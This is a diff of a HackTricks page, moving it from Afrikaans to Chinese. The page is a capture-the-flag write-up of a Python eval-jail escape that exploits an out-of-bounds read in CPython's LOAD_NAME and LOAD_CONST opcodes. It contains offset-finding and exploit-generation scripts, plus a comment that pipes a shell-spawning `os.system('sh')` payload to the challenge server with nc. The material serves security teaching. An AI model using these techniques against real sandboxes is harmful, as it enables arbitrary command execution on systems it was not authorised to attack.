@@ -1,42 +1,46 @@
-# LOAD_NAME / LOAD_CONST opcode OOB Lees
+# LOAD\_NAME / LOAD\_CONST opcode OOB 读取
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-**Hierdie inligting is geneem** [**uit hierdie skryfstuk**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
+**此信息来自** [**这篇文章**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Ons kan die OOB leesfunksie in die LOAD_NAME / LOAD_CONST opcode gebruik om 'n simbool in die geheue te kry. Dit beteken dat ons 'n truuk soos `(a, b, c, ... honderde simbole ..., __getattribute__) if [] else [].__getattribute__(...)` kan gebruik om 'n simbool (soos 'n funksienaam) te kry wat jy wil hê.
+我们可以使用 LOAD\_NAME / LOAD\_CONST opcode 中的 OOB 读取功能来获取内存中的某些符号。这意味着使用像 `(a, b, c, ... 数百个符号 ..., __getattribute__) if [] else [].__getattribute__(...)` 这样的技巧来获取你想要的符号（例如函数名）。
 
-Maak dan net jou aanval gereed.
+然后只需制作你的利用代码。
 
-### Oorsig <a href="#overview-1" id="overview-1"></a>
+### 概述 <a href="#overview-1" id="overview-1"></a>
 
-Die bronkode is redelik kort, bevat slegs 4 reëls!
+源代码非常简短，仅包含 4 行！
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-### Buitengrenslees <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+您可以输入任意 Python 代码，它将被编译为一个 [Python code object](https://docs.python.org/3/c-api/code.html)。但是该代码对象的 `co_consts` 和 `co_names` 将在评估该代码对象之前被替换为空元组。
 
-Hoe gebeur die segmenteringsfout?
+因此，以这种方式，所有包含常量（例如数字、字符串等）或名称（例如变量、函数）的表达式最终可能导致段错误。
 
-Laten ons begin met 'n eenvoudige voorbeeld, `[a, b, c]` kan in die volgende bytekode kompileer word.
+### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+
+段错误是如何发生的？
+
+让我们从一个简单的例子开始，`[a, b, c]` 可以编译成以下字节码。
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -44,11 +48,11 @@ Laten ons begin met 'n eenvoudige voorbeeld, `[a, b, c]` kan in die volgende byt
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Maar wat as die `co_names` 'n leë tuple word? Die `LOAD_NAME 2` opcode word steeds uitgevoer, en probeer om waarde van daardie geheue-adres te lees waar dit oorspronklik moes wees. Ja, dit is 'n out-of-bound read "kenmerk".
+但如果 `co_names` 变为空元组呢？`LOAD_NAME 2` 操作码仍然会被执行，并尝试从原本应该读取的内存地址读取值。是的，这是一种越界读取的“特性”。
 
-Die kernkonsep vir die oplossing is eenvoudig. Sommige opcodes in CPython byvoorbeeld `LOAD_NAME` en `LOAD_CONST` is kwesbaar (?) vir OOB lees.
+解决方案的核心概念很简单。在 CPython 中，一些操作码，例如 `LOAD_NAME` 和 `LOAD_CONST`，对越界读取是脆弱的（？）。
 
-Hulle haal 'n objek van indeks `oparg` van die `consts` of `names` tuple op (dit is wat `co_consts` en `co_names` onder die oppervlak genoem word). Ons kan na die volgende kort snipper oor `LOAD_CONST` verwys om te sien wat CPython doen wanneer dit na die `LOAD_CONST` opcode verwerk.
+它们从 `consts` 或 `names` 元组中的索引 `oparg` 检索对象（这就是 `co_consts` 和 `co_names` 在底层的名称）。我们可以参考以下关于 `LOAD_CONST` 的简短代码片段，看看 CPython 在处理 `LOAD_CONST` 操作码时所做的事情。
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -58,21 +62,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-Op hierdie manier kan ons die OOB-funksie gebruik om 'n "naam" vanaf 'n arbitrêre geheueverskuiwing te kry. Om seker te maak watter naam dit het en wat die verskuiwing is, bly net probeer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... En jy kan iets vind met ongeveer oparg > 700. Jy kan ook probeer om gdb te gebruik om natuurlik na die geheue-indeling te kyk, maar ek dink nie dit sal makliker wees nie?
+通过这种方式，我们可以使用 OOB 特性从任意内存偏移量获取一个“名称”。为了确保它的名称和偏移量是什么，只需不断尝试 `LOAD_NAME 0`，`LOAD_NAME 1` ... `LOAD_NAME 99` ... 你可以在大约 oparg > 700 的地方找到一些东西。当然，你也可以尝试使用 gdb 查看内存布局，但我认为这并不会更容易？
 
-### Die Exploit Genereer <a href="#generating-the-exploit" id="generating-the-exploit"></a>
+### 生成漏洞利用 <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Sodra ons daardie nuttige verskuiwings vir name / konstantes terugkry, hoe _kry_ ons 'n naam / konstante van daardie verskuiwing en gebruik dit? Hier is 'n truuk vir jou:\
-Laat ons aanneem ons kan 'n `__getattribute__`-naam vanaf verskuiwing 5 (`LOAD_NAME 5`) met `co_names=()` kry, doen dan net die volgende dinge:
+一旦我们检索到这些有用的名称/常量偏移量，我们如何从该偏移量获取名称/常量并使用它呢？这里有一个技巧：\
+假设我们可以从偏移量 5 (`LOAD_NAME 5`) 获取一个 `__getattribute__` 名称，且 `co_names=()`，那么只需执行以下操作：
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Merk op dat dit nie nodig is om dit as `__getattribute__` te noem nie, jy kan dit noem as iets korter of vreemder
+> 注意，不必将其命名为 `__getattribute__`，您可以将其命名为更短或更奇怪的名称
 
-Jy kan die rede daaragter verstaan deur net na sy bytekode te kyk:
+您只需查看其字节码即可理解原因：
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -89,20 +93,20 @@ Jy kan die rede daaragter verstaan deur net na sy bytekode te kyk:
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-Merk op dat `LOAD_ATTR` ook die naam uit `co_names` ophaal. Python laai name vanaf dieselfde offset as die naam dieselfde is, so die tweede `__getattribute__` word steeds gelaai vanaf offset=5. Deur hierdie kenmerk te gebruik, kan ons 'n arbitrêre naam gebruik sodra die naam in die geheue naby is.
+注意到 `LOAD_ATTR` 也从 `co_names` 中检索名称。Python 从相同的偏移量加载名称，如果名称相同，因此第二个 `__getattribute__` 仍然从 offset=5 加载。利用这个特性，我们可以在名称在附近的内存中时使用任意名称。
 
-Vir die genereer van getalle behoort dit triviaal te wees:
+生成数字应该是微不足道的：
 
 * 0: not \[\[]]
 * 1: not \[]
 * 2: (not \[]) + (not \[])
 * ...
 
-### Uitbuitingskrips <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Ek het nie konstantes gebruik as gevolg van die lengtebeperking nie.
+我没有使用常量是因为长度限制。
 
-Eerstens hier is 'n skrips vir ons om daardie offsets van name te vind.
+首先，这里有一个脚本供我们查找这些名称的偏移量。
 ```python
 from types import CodeType
 from opcode import opmap
@@ -137,7 +141,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-En die volgende is vir die skep van die werklike Python uitbuit.
+而以下内容用于生成真实的 Python 漏洞利用代码。
 ```python
 import sys
 import unicodedata
@@ -214,7 +218,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Dit doen basies die volgende dinge, vir daardie strings wat ons kry van die `__dir__` metode:
+它基本上执行以下操作，对于我们从 `__dir__` 方法获取的那些字符串：
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -228,16 +232,16 @@ getattr(
 builtins['eval'](builtins['input']())
 ```
 {% hint style="success" %}
-Leer & oefen AWS-hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
